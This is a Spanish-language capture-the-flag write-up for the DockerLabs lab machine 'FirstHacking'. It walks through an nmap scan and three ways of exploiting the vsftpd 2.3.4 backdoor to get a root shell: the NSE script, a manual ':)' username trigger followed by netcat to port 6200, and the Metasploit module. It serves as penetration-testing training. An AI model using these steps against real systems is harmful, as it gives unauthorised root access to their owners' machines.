---
title: FirstHacking
platform: DockerLabs
os: Linux
difficulty: Muy fácil
ip: 172.17.0.2
services: 21/tcp (FTP)
hops: 1
tags: [Nmap, FTP, vsftpd, Backdoor, Metasploit, Netcat]
description: Explotación de la famosa puerta trasera en vsftpd 2.3.4 mediante tres metodologías diferentes para obtener acceso como root.
---

## Fase 1: Reconocimiento
nmap · escaneo de servicios

Comenzamos realizando un escaneo exhaustivo sobre la máquina objetivo para identificar puertos abiertos y las versiones de los servicios correspondientes.

```terminal [nmap]
\$ nmap -sCV -sS -n -Pn -p- 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 8A:1A:0B:E8:D0:CC (Unknown)
Service Info: OS: Unix
```

## Fase 2: Explotación y Acceso Inicial

La versión **vsftpd 2.3.4** es conocida por contener una puerta trasera (CVE-2011-2523). Si se introduce un nombre de usuario que termine con los caracteres `:)`, el servicio abre un shell interactivo en el puerto **6200/TCP**.

A continuación, se detallan los 3 métodos para comprobar y explotar este vector.

### Método 1: Verificación automatizada con Nmap (NSE)
Utilizamos el motor de scripts de Nmap (`NSE`) para comprobar si el objetivo es vulnerable de forma directa y segura.

```terminal [nmap-nse]
\$ nmap --script ftp-vsftpd-backdoor -p 21 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsftpd ext2/ext3 backdoor
|     State: VULNERABLE (Exploitable)
|     Description: vsftpd version 2.3.4 contains a backdoor...
```

### Método 2: Explotación Manual (FTP + Netcat)
Provocamos la activación de la puerta trasera de forma manual enviando el usuario trampa y conectándonos con `netcat` al puerto resultante.

1. Enviamos el disparador a través del cliente FTP tradicional:
```terminal [ftp-trigger]
\$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:usuario): anonymous:)
331 Please specify the password.
Password: password123
```
*(Nota: La sesión parecerá colgarse. Abrimos una nueva pestaña en nuestra terminal).*

2. Conectamos al puerto oculto `6200` que se acaba de abrir en el objetivo:
```terminal [netcat-connect]
\$ nc -nv 172.17.0.2 6200
(UNKNOWN) 6200 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
```

### Método 3: Explotación Automatizada con Metasploit
Hacemos uso del framework Metasploit para automatizar tanto la activación como la recepción de la consola interactiva.

```terminal [msfconsole]
\$ msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: Sending backdoor command...
[+] 172.17.0.2:21 - Backdoor service has been spawned, connecting...
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:4321 -> 172.17.0.2:6200)

whoami
root
```

## Fase 3: Escalada de privilegios {root}
usuario → root

Debido a la naturaleza de la vulnerabilidad de la puerta trasera en el demonio de vsftpd (el cual corre nativamente con máximos privilegios), **el acceso inicial obtenido por cualquiera de los tres métodos nos otorga directamente una sesión como el usuario administrador (`root`)**. No se requiere realizar ningún paso adicional de escalada.

:::flag
¡Máquina completada! Acceso inmediato conseguido como root a través de la backdoor de vsftpd.
uid=0(root) gid=0(root) groups=0(root)
:::
